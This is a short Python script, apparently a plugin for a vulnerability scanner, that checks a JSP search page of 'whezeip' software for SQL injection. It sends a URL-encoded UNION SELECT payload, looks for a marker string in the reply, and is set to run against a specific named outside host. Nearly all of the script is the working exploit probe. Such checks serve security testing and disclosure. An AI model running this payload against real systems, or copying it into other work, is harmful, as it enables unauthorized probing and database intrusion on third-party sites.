#!/usr/bin/env python
# coding: UTF-8

#ref: http://wooyun.org/bugs/wooyun-2015-0113025
#__author__ = 'superpi'

def assign(service,arg):
    if service == "whezeip":
        return True,arg

def audit(arg):
    url=arg+'defaultroot/public/select_user/search_org_list.jsp?searchName='
    url=url +"1%27%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28117%29%2bCHAR%28115%29%2bCHAR%28113%29%2bCHAR%2899%29%2bCHAR%28118%29%2bCHAR%28113%29--"
    code,head,res,errcode,finalurl=curl.curl2(url)
    if code==200 and "qvusqcvq" in res:
        security_hole('find post sql injection: ' + arg+'defaultroot/public/select_user/search_org_list.jsp?searchName=1')

if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip', 'http://www.jhxy.cn:7001/')[1])